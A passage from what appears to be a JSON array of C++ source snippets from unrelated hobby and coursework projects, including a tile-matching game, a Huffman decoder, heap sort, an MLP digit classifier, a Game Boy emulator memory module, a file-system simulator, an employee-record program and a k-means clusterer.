i++)\n\t\t{\n\t\t\tfor (int j = 0; j < 6; j++)\n\t\t\t{\n\t\t\t\tc[i][j] = 65 + x;\n\t\t\t\tcnt++;\n\t\t\t\tif (cnt == 4)\n\t\t\t\t{\n\t\t\t\t\tx++;\n\t\t\t\t\tcnt = 0;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tfor (int i = 0; i < 6; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < 6; j++)\n\t\t\t{\n\t\t\t\tswap(c[i][j], c[rand() % 6][rand() % 6]);\n\t\t\t}\n\t\t}\n\t\tfor (int i = 0; i < 6; i++)\n\t\t{\n\t\t\tfor (int j = 0; j < 6; j++)\n\t\t\t{\n\t\t\t\tInterface::GotoXY(7 * j + 7, 5 * i + 3);\n\t\t\t\tcout << c[i][j];\n\t\t\t}\n\t\t}\n\t}\n}\n//Check I matching \nbool CheckIsMatchingI(Board** board, pair<int, int>index1, pair<int, int>index2)\n{\n\tif (index1.first == index2.first && index1.second == index2.second)\n\t{\n\t\treturn false;\n\t}\n\tbool KT = true;\n\t//Check the same row\n\tif (index1.first == index2.first)\n\t{\n\t\t//Check from the min column to the max column\n\t\tfor (int i = min(index1.second, index2.second) + 1; i < max(index1.second, index2.second); i++)\n\t\t{\n\t\t\tif (board[index1.first][i].key != 0)\n\t\t\t{\n\t\t\t\tKT = false;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (KT == true)\n\t\t{\n\t\t\treturn true;\n\t\t}\n\t}\n\t//Check the same col\n\tif (index1.second == index2.second)\n\t{\n\t\t//Check from the min row to the max row\n\t\tfor (int i = min(index1.first, index2.first) + 1; i < max(index1.first, index2.first); i++)\n\t\t{\n\t\t\tif (board[i][index1.second].key != 0)\n\t\t\t{\n\t\t\t\tKT = false;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (KT == true)\n\t\t{\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\n//Check L matching\nbool CheckIsMatchingL(Board** board, pair<int, int>index1, pair<int, int>index2)\n{\n\tint index;\n\tif (min(index1.second, index2.second) == index1.second)\n\t{\n\t\tindex = index1.first;\n\t}\n\telse\n\t{\n\t\tindex = index2.first;\n\t}\n\tif (CheckIsMatchingI(board, { index, min(index1.second, index2.second) }, { index, max(index1.second, index2.second) + 1 }) == true) // c\u1ed9ng 1 l\u00e0 do h\u00e0m isMatchingI ch\u1ec9 l\u1ea5y \u1edf gi\u1eefa \u0111o\u1ea1n\n\t{\n\t\tif (CheckIsMatchingI(board, { min(index1.first, index2.first), max(index1.second, index2.second) }, { max(index1.first, index2.first), max(index1.second, index2.second) }) == true)\n\t\t{\n\t\t\treturn true;\n\t\t}\n\t}\n\n\n\tif (max(index1.second, index2.second) == index1.second)\n\t{\n\t\tindex = index1.first;\n\t}\n\telse\n\t{\n\t\tindex = index2.first;\n\t}\n\tif (CheckIsMatchingI(board, { index, min(index1.second, index2.second) - 1 }, { index, max(index1.second, index2.second) }) == true)\n\t{\n\t\tif (CheckIsMatchingI(bo",
    "#include <iostream>\n#include <vector>\n#include <unordered_map>\n#include <bitset>\n#include <algorithm>\n#include <fstream>\n#include <string>\n#include <queue>\n#include <iomanip>\n#include \"kaitai/kaitaistream.h\"\n#include \"column_data_dictionary.h\"\n\n// Huffman Tree Node definition\nstruct HuffmanTree {\n    uint8_t c;\n    HuffmanTree* left;\n    HuffmanTree* right;\n\n    HuffmanTree(uint8_t c = 0) : c(c), left(nullptr), right(nullptr) {}\n    ~HuffmanTree() {\n        delete left;\n        delete right;\n    }\n};\n\nstd::string iso88591_to_utf8(uint8_t code) {\n    std::string utf8;\n    if (code >= 0x80) {\n        utf8.push_back(static_cast<char>(0xC2 + (code > 0xBF)));\n        utf8.push_back(static_cast<char>((code & 0x3F) + 0x80));\n    } else {\n        utf8.push_back(static_cast<char>(code));\n    }\n    return utf8;\n}\n// Function to generate the full 256-byte Huffman array from the compact 128-byte encode_array\nstd::vector<uint8_t> decompress_encode_array(const std::vector<uint8_t>& compressed) {\n    std::vector<uint8_t> full_array(256, 0);\n\n    for (size_t i = 0; i < compressed.size(); i++) {\n        uint8_t byte = compressed[i];\n        full_array[2 * i] = byte & 0x0F;         // Lower nibble\n        full_array[2 * i + 1] = (byte >> 4) & 0x0F; // Upper nibble\n    }\n\n    return full_array;\n}\n\n// Function to generate Huffman codes based on codeword lengths\nstd::unordered_map<uint8_t, std::string> generate_codes(const std::vector<uint8_t>& lengths) {\n    std::unordered_map<uint8_t, std::string> codes;\n    std::vector<std::pair<uint8_t, uint8_t>> sorted_lengths;\n\n    // Collect only the non-zero lengths and their associated symbols\n    for (auto i = 0; i < 256; i++) {\n        if (lengths[i] != 0){\n            sorted_lengths.emplace_back(lengths[i], i);\n        }\n    }\n    // Sort by length first, then by character\n    std::sort(sorted_lengths.begin(), sorted_lengths.end(), [](const auto& a, const auto& b) {\n        return a.first != b.first ? a.first < b.first : a.second < b.second;\n    });\n\n    int code = 0;\n    int last_length = 0;\n\n    for (const auto& [length, character] : sorted_lengths) {\n        if (last_length != length) {\n            code <<= (length - last_length); // Shift code by difference in lengths\n            last_length = length;\n        }\n\n        // Generate the code string representation up to 15 bits\n        codes[character] = std::bitset<15>(code).to_string().substr(15 - length);\n        code++;\n    }\n\n    return codes;\n}\n\n// Print Huffman codes\nvoid print_huffman_codes(const std::unordered_map<uint8_t, std::string>& codes) {\n    std::cout << \"Huffman Codes:\\n\";\n    for (const auto& [character, code] : codes) {\n        std::cout << (int)character <<\" - \" << character << \": \" << code << '\\n';\n        }\n}\n\n// Build Huffman tree based on generated codes\nHuffmanTree* build_huffman_tree(const std::vector<uint8_t>& encode_array) {\n    auto codes = generate_codes(encode_array);\n// print_huffman_codes(codes);\n    HuffmanTree* root = new HuffmanTree;\n\n    for (const auto& [character, code] : codes) {\n        HuffmanTree* node = root;\n        for (char bit : code) {\n            if (bit == '0') {\n                if (!node->left) node->left = new HuffmanTree;\n                node = node->left;\n            } else {\n                if (!node->right) node->right = new HuffmanTree;\n                node = node->right;\n            }\n        }\n        node->c = character;\n    }\n\n    return root;\n}\n// Decode a bitstream from start to end bit positions using the Huffman tree\nstd::string decode_substring(const std::string& bitstream, HuffmanTree* tree, uint32_t start_bit, uint32_t end_bit) {\n    std::string result;\n    const HuffmanTree* node = tree;\n    uint32_t total_bits = end_bit - start_bit;\n\n    // Adjust bit position calculation for little endian byte order\n    for (uint32_t i = 0; i < total_bits; ++i) {\n        uint32_t bit_pos = start_bit + i;\n        uint32_t byte_pos = bit_pos / 8;\n        uint32_t bit_offset = bit_pos % 8;\n\n        // Convert byte index for little endian (pair-wise)\n        byte_pos = (byte_pos & ~0x01) + (1 - (byte_pos & 0x01));\n\n        if (!node->left && !node->right) {\n            result += iso88591_to_utf8(node->c);\n            node = tree; // Reset to the root node\n        }\n\n        // Traverse the Huffman tree based on the current bit\n        if (bitstream[byte_pos] & (1 << (7 - bit_offset))) {  // Adjusting bit offset to read from MSB to LSB\n            node = node->right;\n        } else {\n            node = node->left;\n        }\n    }\n\n    // Append the last character if the final node is a leaf\n    if (!node->left && !node->right) {\n        result += iso88591_to_utf8(node->c);\n    }\n\n    return result;\n}\n\n\n// Print Huffman tree in a readable format\nvoid print_huffman_tree(HuffmanTree* node, int indent = 0) {\n    if (node == nullptr) return;\n\n    if (node->right) print_huffman_tree(node->right, indent + 4);\n\n    if (indent) std::cout << std::setw(indent) << ' ';\n    if (!node->left && ",
    "#include <iostream>\r\nusing namespace std;\r\nvoid heapify(int arr[], int n, int i) {\r\n int largest = i;\r\n int left = 2 * i + 1;\r\n int right = 2 * i + 2;\r\n // If left child is larger than root\r\n if (left < n && arr[left] > arr[largest])\r\n largest = left;\r\n // If right child is larger than largest so far\r\n if (right < n && arr[right] > arr[largest])\r\n largest = right;\r\n // If largest is not root\r\n if (largest != i) {\r\n swap(arr[i], arr[largest]);\r\n // Recursively heapify the affected sub-tree\r\n heapify(arr, n, largest);\r\n }\r\n}\r\nvoid heapSort(int arr[], int n) {\r\n // Build heap (rearrange array)\r\n for (int i = n / 2 - 1; i >= 0; i--)\r\n heapify(arr, n, i);\r\n \r\n// One by one extract an element from heap\r\n for (int i = n - 1; i > 0; i--) {\r\n \r\n// Move current root to end\r\n swap(arr[0], arr[i]);\r\n // Call max heapify on the reduced heap\r\n heapify(arr, i, 0);\r\n }\r\n}\r\nint main() {\r\n int n;\r\n cout << \"Enter the number of elements: \";\r\n cin >> n;\r\n int arr[n];\r\n cout << \"Enter \" << n << \" integers: \";\r\n for (int i = 0; i < n; i++) {\r\n cin >> arr[i];\r\n }\r\n heapSort(arr, n);\r\n cout << \"Sorted array in ascending order: \";\r\n for (int i = 0; i < n; i++) {\r\n cout << arr[i] << \" \";\r\n }\r\n cout << endl;\r\n return 0;\r\n}\r\n",
    "#include \"Matrix.h\"\n#include \"Activation.h\"\n#include \"Dense.h\"\n#include \"MlpNetwork.h\"\n#include <fstream>\n\n\n\n#define QUIT \"q\"\n#define INSERT_IMAGE_PATH \"Please insert image path:\"\n#define ERROR_INAVLID_PARAMETER \"Error: invalid Parameters file for layer: \"\n#define ERROR_INVALID_INPUT \"Error: Failed to retrieve input. Exiting..\"\n#define ERROR_INVALID_IMG \"Error: invalid image path or size: \"\n#define USAGE_MSG \"Usage:\\n\" \\\n                  \"\\t./mlpnetwork w1 w2 w3 w4 b1 b2 b3 b4\\n\" \\\n                  \"\\twi - the i'th layer's weights\\n\" \\\n                  \"\\tbi - the i'th layer's biases\"\n#define USAGE_ERR \"Error: wrong number of arguments.\"\n#define ARGS_START_IDX 1\n#define ARGS_COUNT (ARGS_START_IDX + (MLP_SIZE * 2))\n#define WEIGHTS_START_IDX ARGS_START_IDX\n#define BIAS_START_IDX (ARGS_START_IDX + MLP_SIZE)\n\n/**\n * Prints program usage to stdout.\n * @param argc number of arguments given in the program\n * @throw std::domain_error in case of wrong number of arguments\n */\nvoid usage (int argc) noexcept (false)\n{\n  if (argc != ARGS_COUNT)\n  {\n\tthrow std::domain_error (USAGE_ERR);\n  }\n  std::cout << USAGE_MSG << std::endl;\n}\n\n/**\n * Given a binary file path and a matrix,\n * reads the content of the file into the matrix.\n * file must match matrix in size in order to read successfully.\n * @param filePath - path of the binary file to read\n * @param mat -  matrix to read the file into.\n * @return boolean status\n *          true - success\n *          false - failure\n */\nbool readFileToMatrix (const std::string &filePath, Matrix &mat)\n{\n  std::ifstream is;\n  is.open(filePath, std::ios::in | std::ios::binary);\n  if (!is.is_open())\n  {\n\treturn false;\n  }\n  is >> mat;\n  is.close();\n  return true;\n}\n\n\n/**\n * Loads MLP parameters from weights & biases paths\n * to Weights[] and Biases[].\n * Throws an exception upon failures.\n * @param paths array of programs arguments, expected to be mlp parameters\n *        path.\n * @param weights array of matrix, weigths[i] is the i'th layer weights matrix\n * @param biases array of matrix, biases[i] is the i'th layer bias matrix\n *          (which is actually a vector)\n *  @throw std::invalid_argument in case of problem with a certain argument\n */\nvoid loadParameters (char *paths[ARGS_COUNT], Matrix weights[MLP_SIZE],\n\t\t\t\t\t Matrix biases[MLP_SIZE]) noexcept (false)\n{\n  for (int i = 0; i < MLP_SIZE; i++)\n  {\n\tweights[i] = Matrix (weights_dims[i].rows, weights_dims[i].cols);\n\tbiases[i] = Matrix (bias_dims[i].rows, bias_dims[i].cols);\n\n\tstd::string weightsPath (paths[WEIGHTS_START_IDX + i]);\n\tstd::string biasPath (paths[BIAS_START_IDX + i]);\n\n\tif (!(readFileToMatrix (weightsPath, weights[i]) &&\n\t\t  readFileToMatrix (biasPath, biases[i])))\n\t{\n\t  auto msg = ERROR_INAVLID_PARAMETER + std::to_string (i + 1);\n\t  throw std::invalid_argument (msg);\n\t}\n\n  }\n}\n\n/**\n * This programs Command line interface for the mlp network.\n * Looping on: {\n *                  Retrieve user input\n *                  Feed input to mlpNetwork\n *                  print image & netowrk prediction\n *             }\n * Throws an exception on fatal errors: unable to read user input path.\n * @param mlp MlpNetwork to use in order to predict img.\n * @throw std::invalid_argument in case of problem with the user input path\n */\nvoid mlpCli (MlpNetwork &mlp) noexcept (false)\n{\n  Matrix img (img_dims.rows, img_dims.cols);\n//  std::cout<<img_dims.rows<<\" \"<<img_dims.cols;\n  std::string imgPath;\n\n  std::cout << INSERT_IMAGE_PATH << std::endl;\n  std::cin >> imgPath;\n  if (!std::cin.good ())\n  {\n\tthrow std::invalid_argument (ERROR_INVALID_INPUT);\n  }\n\n  while (imgPath != QUIT)\n  {\n\tif (readFileToMatrix (imgPath, img))\n\t{\n\t  Matrix imgVec = img;\n//\t  std::cout<<imgVec.get_cols();\n//\t  imgVec.plain_print();\n\t  digit output = mlp (imgVec.vectorize ());\n\t  std::cout << \"Image processed:\" << std::endl\n\t\t\t\t<< img << std::endl;\n\t  std::cout << \"Mlp result: \" << output.value <<\n\t\t\t\t\" at probability: \" << output.probability << std::endl;\n\t}\n\telse\n\t{\n\t  throw std::invalid_argument (ERROR_INVALID_IMG + imgPath);\n\t}\n\n\tstd::cout << INSERT_IMAGE_PATH << std::endl;\n\tstd::cin >> imgPath;\n\tif (!std::cin.good ())\n\t{\n\t  throw std::invalid_argument (ERROR_INVALID_INPUT);\n\t}\n  }\n}\n\n/**\n * Program's main\n * @param argc count of args\n * @param argv args values\n * @return program exit status code\n */\nint main (int argc, char **argv)\n{\n  \n  try\n  {\n\tusage (argc);\n  }\n  catch (const std::domain_error &domainError)\n  {\n\tstd::cerr << domainError.what () << std::endl;\n\treturn EXIT_FAILURE;\n\n  }\n\n  Matrix weights[MLP_SIZE];\n  Matrix biases[MLP_SIZE];\n\n  try\n  {\n\tloadParameters (argv, weights, biases);\n\n  }\n  catch (const std::invalid_argument &invalidArgument)\n  {\n\tstd::cerr << invalidArgument.what () << std::endl;\n\treturn EXIT_FAILURE;\n  }\n  \n  MlpNetwork mlp (weights, biases);\n\n  try\n  {\n\tmlpCli (mlp);\n  }\n\n  catch (const std::invalid_argument &invalidArgument)\n  {\n\tstd::cerr << invalidArgument.what () << std::endl;\n\treturn EXIT_FAILURE;\n\n  }\n\n  return EXIT_SUCCE",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"memory.h\"\n#include \"../cpu/cpu.h\"\n#include <iostream>\n\nMemory::Memory(Cartridge *cartridge, Debugger *debugger)\n{\n    this->debugger = debugger;\n    reset();\n    romSize = cartridge->rom.size();\n    std::cout << \"rom size: \" << romSize << std::endl;\n    for (size_t i = 0; i < cartridge->rom.size(); i++)\n    {\n        map[i] = cartridge->rom[i];\n    }\n}\n\nvoid Memory::setCPU(CPU *cpu)\n{\n    this->cpu = cpu;\n}\n\nvoid Memory::reset()\n{\n    map[0xFF05] = 0x00;\n    map[0xFF06] = 0x00;\n    map[0xFF07] = 0x00;\n    map[0xFF0F] = 0xE1;\n    map[0xFF10] = 0x80;\n    map[0xFF11] = 0xBF;\n    map[0xFF12] = 0xF3;\n    map[0xFF14] = 0xBF;\n    map[0xFF16] = 0x3F;\n    map[0xFF17] = 0x00;\n    map[0xFF19] = 0xBF;\n    map[0xFF1A] = 0x7F;\n    map[0xFF1B] = 0xFF;\n    map[0xFF1C] = 0x9F;\n    map[0xFF1E] = 0xBF;\n    map[0xFF20] = 0xFF;\n    map[0xFF21] = 0x00;\n    map[0xFF22] = 0x00;\n    map[0xFF23] = 0xBF;\n    map[0xFF24] = 0x77;\n    map[0xFF25] = 0xF3;\n    map[0xFF26] = 0xF1;\n    map[0xFF40] = 0x91;\n    map[0xFF42] = 0x00;\n    map[0xFF43] = 0x00;\n    map[0xFF45] = 0x00;\n    map[0xFF47] = 0xFC;\n    map[0xFF48] = 0xFF;\n    map[0xFF49] = 0xFF;\n    map[0xFF4A] = 0x00;\n    map[0xFF4B] = 0x00;\n    map[0xFFFF] = 0x00;\n}\n\nuint8_t Memory::readByte(uint16_t address)\n{\n    if(address == 0xFF00) {\n        if(debugger->doPrint2) std::cout << \"reading from joypad: <\" << (int)cpu->getJoypadState() << \">\" << std::endl;\n        return cpu->getJoypadState();\n    }\n \n\n    return map[address];\n}\n\nvoid Memory::writeByte(uint16_t address, uint8_t value)\n{\n    if (address == 0xFF46) // DMA Transfer\n    {\n        map[address] = value;\n        for (int i = 0; i < 0xA0; i++)\n        {\n            map[0xFE00 + i] = map[(value << 8) + i];\n        }\n    }\n    else if (address == TMC)\n    {\n        uint8_t currentfreq = cpu->readClockFrequency();\n        map[address] = value;\n        uint8_t newfreq = cpu->readClockFrequency();\n        if (currentfreq != newfreq)\n        {\n            cpu->setClockFrequency();\n        }\n    }\n    // else if (address == 0xFF44)\n    // {\n    //     map[address] = 0;\n    // }\n    // else if (address == 0xFF00)\n    // {\n    //     map[address] = 1;\n    // }\n    // if the address is in rom space, do not write to it\n    else if (address >= 0x2000 && address <= 0x8000)\n    {\n         return;\n    }\n    else if (address == 0xFF04)\n    {\n        map[address] = 0;\n    }\n    else\n    {\n\n        map[address] = value;\n    }\n\n    if (address == 0xFF02 && value == 0x81)\n    {\n        std::cout << (char)map[0xFF01];\n    }\n}\n\nvoid Memory::writeDirect(uint16_t address, uint8_t value)\n{\n    map[address] = value;\n}\n\nuint8_t Memory::readDirect(uint16_t address)\n{\n    return map[address];\n}",
    "#include <memory>\n#include <vector>\n#include <string>\n#include <iostream>\n#include <algorithm>\n#include <sstream>\n\nclass Arquivo {\nprivate:\n    std::string nome;\n    std::string conteudo;\n\npublic:\n    Arquivo(const std::string& nome) : nome(nome), conteudo(\"\") {}\n\n    void escrever(const std::string& novoConteudo) {\n        this->conteudo = novoConteudo;\n    }\n\n    void ler() const {\n        std::cout << \"Conte\u00fado do arquivo '\" << nome << \"': \" << conteudo << std::endl;\n    }\n\n    const std::string& getNome() const {\n        return nome;\n    }\n};\n\nclass Diretorio {\nprivate:\n    std::string nome;\n    std::vector<std::shared_ptr<Arquivo>> arquivos;\n    std::vector<std::shared_ptr<Diretorio>> diretorios;\n\npublic:\n    Diretorio(const std::string& nome) : nome(nome) {}\n\n    bool adicionarArquivo(const std::string& nomeArquivo) {\n        if (encontrarArquivo(nomeArquivo)) {\n            return false;\n        }\n        arquivos.push_back(std::make_shared<Arquivo>(nomeArquivo));\n        return true;\n    }\n\n    bool removerArquivo(const std::string& nomeArquivo) {\n        auto it = std::find_if(arquivos.begin(), arquivos.end(),\n            [&nomeArquivo](const std::shared_ptr<Arquivo>& arquivo) {\n                return arquivo->getNome() == nomeArquivo;\n            });\n        if (it != arquivos.end()) {\n            arquivos.erase(it);\n            return true;\n        }\n        return false;\n    }\n\n    bool adicionarDiretorio(const std::string& nomeDiretorio) {\n        if (getDiretorio(nomeDiretorio)) {\n            return false;\n        }\n        diretorios.push_back(std::make_shared<Diretorio>(nomeDiretorio));\n        return true;\n    }\n\n    bool removerDiretorio(const std::string& nomeDiretorio) {\n        auto it = std::find_if(diretorios.begin(), diretorios.end(),\n            [&nomeDiretorio](const std::shared_ptr<Diretorio>& diretorio) {\n                return diretorio->getNome() == nomeDiretorio && diretorio->isEmpty();\n            });\n        if (it != diretorios.end()) {\n            diretorios.erase(it);\n            return true;\n        }\n        return false;\n    }\n\n    std::shared_ptr<Diretorio> getDiretorio(const std::string& nomeDiretorio) {\n        for (auto& diretorio : diretorios) {\n            if (diretorio->getNome() == nomeDiretorio) {\n                return diretorio;\n            }\n        }\n        return nullptr;\n    }\n\n    std::shared_ptr<Arquivo> encontrarArquivo(const std::string& nomeArquivo) {\n        auto it = std::find_if(arquivos.begin(), arquivos.end(),\n            [&nomeArquivo](const std::shared_ptr<Arquivo>& arquivo) {\n                return arquivo->getNome() == nomeArquivo;\n            });\n        return it != arquivos.end() ? *it : nullptr;\n    }\n\n    void escreverArquivo(const std::string& nomeArquivo, const std::string& conteudo) {\n        auto arquivo = encontrarArquivo(nomeArquivo);\n        if (arquivo) {\n            arquivo->escrever(conteudo);\n        }\n        else {\n            std::cout << \"Erro: Arquivo n\u00e3o encontrado.\\n\";\n        }\n    }\n\n    void lerArquivo(const std::string& nomeArquivo) {\n        auto arquivo = encontrarArquivo(nomeArquivo);\n        if (arquivo) {\n            arquivo->ler();\n        }\n        else {\n            std::cout << \"Erro: Arquivo n\u00e3o encontrado.\\n\";\n        }\n    }\n\n    void listarConteudo() const {\n        std::cout << \"Conte\u00fado do Diret\u00f3rio '\" << nome << \"':\" << std::endl;\n        for (const auto& arquivo : arquivos) {\n            std::cout << \"  Arquivo: \" << arquivo->getNome() << std::endl;\n        }\n        for (const auto& diretorio : diretorios) {\n            std::cout << \"  Diret\u00f3rio: \" << diretorio->getNome() << std::endl;\n        }\n    }\n\n    const std::string& getNome() const {\n        return nome;\n    }\n\n    bool isEmpty() const {\n        return arquivos.empty() && diretorios.empty();\n    }\n};\n\nint main() {\n    std::shared_ptr<Diretorio> root = std::make_shared<Diretorio>(\"root\");\n    std::shared_ptr<Diretorio> currentDir = root;\n    std::string linha, comando, nome, conteudo;\n\n    std::cout << \"Simulador de Sistema de Arquivos iniciado. Digite 'help' para ajuda.\\n\";\n\n    while (true) {\n        std::cout << currentDir->getNome() << \"> \";\n        std::getline(std::cin, linha);\n        std::istringstream iss(linha);\n        iss >> comando;\n\n        if (comando == \"create_file\") {\n            iss >> nome;\n            if (!currentDir->adicionarArquivo(nome)) {\n                std::cout << \"Erro: Arquivo j\u00e1 existe.\\n\";\n            }\n        }\n        else if (comando == \"write_file\") {\n            iss >> nome;\n            iss.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\n            std::getline(std::cin, conteudo);  \n            currentDir->escreverArquivo(nome, conteudo);\n        }\n        else if (comando == \"read_file\") {\n            iss >> nome;\n            currentDir->lerArquivo(nome);\n        }\n        else if (comando == \"delete_file\") {\n            iss >> nome;\n            if (!currentDir->removerArquivo(nome)) {\n",
    "/*\r\n\ud83d\udd18 PROBLEM STATEMENT:- \r\nCompany maintains employee information as employee ID,\r\nname, designation and salary. Allow user to add, deleteinformation of\r\nemployee. Display information of particular\r\nemployee. If employee does not exist an appropriate message is\r\ndisplayed. If it is, then the system displays the employee details.\r\nUse index sequential file to maintain the data.\r\n*/ \r\n\r\n/*\r\n#\ufe0f\u20e3Quick Revision Notes:-\r\n\ud83d\udd39Sequential Files:- Sequential files refer to a method of organizing and storing data in a linear or sequential manner.\r\n\r\n1. Data is not store in specific order.\r\n2. In sequential files elements are accessed and precessed in the order they are stored.\r\n\r\nEX :- Bill of shopping. \r\n*/ \r\n\r\n#include<iostream>\r\n#include<fstream>\r\n#include<iomanip>\r\n#include<vector>\r\nusing namespace std;\r\n\r\nvoid addEmployee(){\r\n    ofstream f(\"db.txt\", ios::app);\r\n\r\n    string employee_id, name, educataion, salary;\r\n\r\n    cout<<\"--- ADD Employee IN DATABASE ---\"<<endl;\r\n\r\n    cout<<\"Enter Employee ID : \";\r\n    cin>>employee_id;\r\n    cout<<\"\\nEnter Employee Name : \";\r\n    cin>>name;\r\n    cout<<\"\\nEnter Employee Designamtion : \";\r\n    cin>>educataion;\r\n    cout<<\"\\nEnter Employee Salary : \";\r\n    cin>>salary;\r\n    cout<<endl;\r\n\r\n    f<<left<<setw(20)<<employee_id<<setw(20)<<name <<setw(20)<< educataion <<setw(20)<<salary<<endl;\r\n    cout<<\"Employee Added Successfully.\\n\";\r\n    f.close();\r\n\r\n}\r\n\r\nvoid deleteEmployee() {\r\n    ifstream inputFile(\"db.txt\");\r\n    string line;\r\n    string employee_id;\r\n    cout << \"Enter Employee ID To Delete: \";\r\n    cin >> employee_id;\r\n\r\n    vector<string> fileLines;\r\n    while (getline(inputFile, line)) {\r\n        if (line.substr(0, line.find(' ')) != employee_id) {\r\n            fileLines.push_back(line);\r\n        }\r\n    }\r\n\r\n    inputFile.close();\r\n\r\n    ofstream outputFile(\"db.txt\", ios::out | ios::trunc);\r\n    for (size_t i = 0; i < fileLines.size(); ++i) {\r\n        outputFile << fileLines[i] << endl;\r\n    }\r\n\r\n    outputFile.close();\r\n}\r\n\r\nvoid searchEmployee(){\r\n    ifstream f(\"db.txt\");\r\n    string line;\r\n    string employee_id;\r\n    cout<<\"Enter Employee ID To Search : \";\r\n    cin>>employee_id;\r\n\r\n    bool found = false;\r\n\r\n    while(getline(f,line)){\r\n        if(line.find(employee_id) != string::npos){\r\n            cout<<\"Employee Details: \"<<endl;\r\n            cout<<\"\\n\"<<line <<endl;\r\n            found =true;\r\n            break;\r\n        }\r\n    }\r\n    f.close();\r\n\r\n    if(!found){\r\n        cout<<\"Sorry, Not found\"<<endl;\r\n    }\r\n\r\n}\r\n\r\nvoid displayData(){\r\n    ifstream f(\"db.txt\");\r\n    string line;\r\n    cout<<\"\\nDisplaying Data :- \"<<endl;\r\n    while(getline(f,line)){\r\n        cout<<\"\\n\"<<line<<endl;\r\n    }\r\n    f.close();\r\n}\r\n\r\nint main(){\r\n\r\n    ofstream f(\"db.txt\", ios::out);\r\n    f<<left<<setw(20) << \"Employee ID\" << setw(20) << \"Name\" << setw(20) << \"educataion\" << setw(20) <<\"salary\"<<endl;\r\n    f.close();\r\n\r\n    int choice;\r\n    while(choice != -1){\r\n        cout<<\"\\n--------- M E N U -----------\"<<endl;\r\n        cout<<\"1. Add Employee.\"; \r\n        cout<<\"\\n2. Delete Employee.\";\r\n        cout<<\"\\n3. Search Employee. \";\r\n        cout<<\"\\n4. Display Data.\";\r\n        cout<<\"\\n5. Exit. \"<<endl;\r\n        cout<<\"-------------------------------\"<<endl;\r\n        cout<<\"Enter Your Choice: \";\r\n        cin>>choice;\r\n        cout<<endl;\r\n\r\n        switch(choice){\r\n            case 1:\r\n                addEmployee();\r\n                break;\r\n            case 2:\r\n                deleteEmployee();\r\n                break;\r\n            case 3:\r\n                searchEmployee();\r\n                break;\r\n            case 4:\r\n                displayData();\r\n                break;\r\n            case 5:\r\n                return 0;\r\n                break;\r\n            default:\r\n                cout<<\"Please ReEnter Your Choice: \";\r\n                break;\r\n        }\r\n\r\n    }\r\n}",
    "#include \"MiniBatchKMeans.h\"\n\n#include <limits>\n#include <random>\n#include <opencv2/core.hpp>\n\n#define CV_L2 4\n\nMiniBatchKMeans::MiniBatchKMeans(int clusters, int iterations, int batchSize, size_t max_no_improvement, double tolerance) \n    : max_no_improvement(max_no_improvement), tolerance(tolerance), clusters(clusters), iterations(iterations), batchSize(batchSize), initialized(false) {\n}\n\nbool MiniBatchKMeans::converged() {\n    if (!initialized)\n        return false; // we havent initialized yet so lets see first\n\n    if (++iteration >= iterations)\n        return true;\n\n    double cinterna = interna.load();\n    if (cinterna < min_interna) {\n        min_interna = cinterna;\n        interna_improvement = 0;\n    } else {\n        if (++interna_improvement == max_no_improvement) {\n            return true;\n        }\n    }\n\n    if (last_interna < 0.0) {\n        diff_interna = std::numeric_limits<double>::max();\n        last_interna = cinterna;\n    } else {\n        diff_interna = std::abs(cinterna - last_interna);\n        last_interna = cinterna;\n    }\n\n    if (diff_interna < tolerance) {\n        return true;\n    }\n\n    interna.store(0);\n\n    return false;\n}\n\ndouble MiniBatchKMeans::error() const {\n    return interna;\n}\n\ndouble MiniBatchKMeans::error_diff() const {\n    return diff_interna;\n}\n\nvoid MiniBatchKMeans::initClusters(cv::Mat& desc) {\n    thread_pool& pool = thread_pool::instance();\n    auto distance = [this, &pool](const size_t numInitClusters, const cv::Mat& desc, std::vector<double>& distances) {\n        const size_t count = std::ceil(static_cast<double>(desc.rows) / pool.threadCount());\n\n        distances.clear();\n        distances.resize(desc.rows);\n\n        std::vector<std::future<double>> done;\n        done.resize(pool.threadCount());\n\n        for (size_t t = 0; t < pool.threadCount(); ++t) {\n            size_t start = t * count;\n            size_t end   = std::min((t + 1) * count, (size_t)desc.rows);\n\n            done[t] = pool.enqueue_task(\n                [this, numInitClusters, start, end, &distances, &desc]() {\n                    double sum = 0.0;\n                    for (size_t i = start; i < end; ++i) {\n                        cv::Mat row = desc.row(i);\n\n                        double distance = std::numeric_limits<double>::max();\n                        for (size_t k = 0; k < numInitClusters; ++k) {\n                            cv::Mat cluster = centers.row(k);\n                            cv::Mat diff = cluster - row;\n\n                            const double norm = cv::norm(diff, CV_L2);\n                            distance = std::min(distance, norm);\n                        }\n\n                        distances[i] = distance;\n                        sum += distance;\n                    